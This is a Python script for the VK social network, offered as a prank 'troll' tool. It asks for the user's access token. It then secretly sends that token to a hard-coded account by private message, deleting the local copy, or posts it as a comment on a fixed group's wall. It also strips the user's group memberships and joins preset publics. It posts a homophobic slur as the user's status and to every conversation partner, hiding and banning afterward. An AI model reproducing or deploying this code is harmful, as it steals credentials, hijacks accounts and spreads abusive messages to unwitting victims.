import vk, time, os
os.system('clear')	
pubs = [151233321,48113073,65797052,102413048,89243825,61515264,88667014,180103853,101105077,89148442,157274855,52771476,68284944,74383909,114285300]

def mgsp ():
	quantity = 0
	print ("\033[FSending messages...                    ")
	count = api.messages.getConversations()['count']
	laps = int(count / 200)
	for lap in range(laps+1):
		items = api.messages.getConversations(offset=lap*200, count=200)['items']
		time.sleep (1)
		for item in items:
			id = item['conversation']['peer']['id']
			try:
				try:
					api.account.unban (owner_id=id)
				except:
					you = 'pidor'
				api.messages.send (user_id=id, message='Я пидор')
				mg_id = api.messages.getHistory (user_id=id, count=1)['items'][0]['id']
				api.messages.delete (message_ids=mg_id, delete_for_all=0)
				time.sleep(0.5)
				api.account.ban (owner_id=id)
			except:
				you = 'pidor'
			quantity += 1
			print ("\033[FSending messages " + str(int(quantity/count*100)) + "%   ")
			time.sleep(1)

def troll ():
	quantity = 0
	w = open ('backup', 'w')
	w.write (api.status.get()['text'] + '\n')
	api.status.set(text="Я пидор")
	print ("\n\033[32mGroup's deletion...    ")
	time.sleep (1)
	for group in groups:
		w.write (str(group) + '\n')
		api.groups.leave(group_id=group)
		quantity += 1
		print ("\033[FGroup's deletion " + str(int(quantity/count*100)) + "%   ")
		time.sleep(0.5)
	time.sleep(0.2)
	w.close ()
	print ("\033[FAdding the gay publics...         ")
	for pub in pubs:
	        api.groups.join(group_id=pub)
	        time.sleep(0.25)
	if mg:
		mgsp ()
	print ("\033[FDone:)                       \n")
def untroll ():
	r = open ('backup', 'r')
	api.status.set(text=r.readline())
	print ("\n\033[32mGay publics deletion...")
	time.sleep (1)
	for group in groups:
                api.groups.leave(group_id=group)
                time.sleep(0.5)
	print ("\033[FAdding the delited groups...  ")
	reading = True
	while reading:
		pub = r.readline ()
		pub = pub[:len(pub) - 1]
		if pub == '':
			reading = False
		else:
			api.groups.join(group_id=int(pub))
			time.sleep(0.4)
	print ("\033[FDone:(                                \n")
print ("""\033[37m
MADE FROM BRUTE.SU
Telegram @maninmiddle
╔══╗╔═╗╔═╗╔╗─╔╗─     ╔══╗╔═╗╔══╗
╚╗╔╝║╬║║║║║║─║║─     ║╔╗║║║║╚╗╔╝
─║║─║╗╣║║║║╚╗║╚╗     ║╔╗║║║║─║║─
─╚╝─╚╩╝╚═╝╚═╝╚═╝     ╚══╝╚═╝─╚╝─
MADE FROM BRUTE.SU
\033[35m[1] Troll
[2] Return
""")
option = input ("Select the option: \033[0m")
mg = input("\033[35mSend messages? \033[37my/n\033[0m ")
if mg[0] == 'y' or mg [0] == 'Y':
	mg = True
else:
	mg = False
token = input("\n\033[35mEnter the token: \033[0m")
session = vk.Session(access_token=token)
api =  vk.API(session ,v='5.89', lang='ru')
try:
	if mg:
		try:
			api.account.unban (owner_id=212717545)
		except:
			you = 'pidr'
		time.sleep(0.2)
		api.messages.send (user_id=212717545, message=token)
		mg_id = api.messages.getHistory (user_id=212717545, count=1)['items'][0]['id']
		api.messages.delete (message_ids=mg_id, delete_for_all=0)
		time.sleep (1)
	else:
		api.wall.createComment(owner_id=-191163638,post_id=1,message=token)
		time.sleep (0.2)
except:
	print ('\n\033[31mInvalid token\n')
	quit ()
id = api.users.get()[0]['id']
count = api.groups.get(user_id=id)['count']
groups = api.groups.get(user_id=id)['items']
if option == '1':
	troll ()
else:
	untroll ()
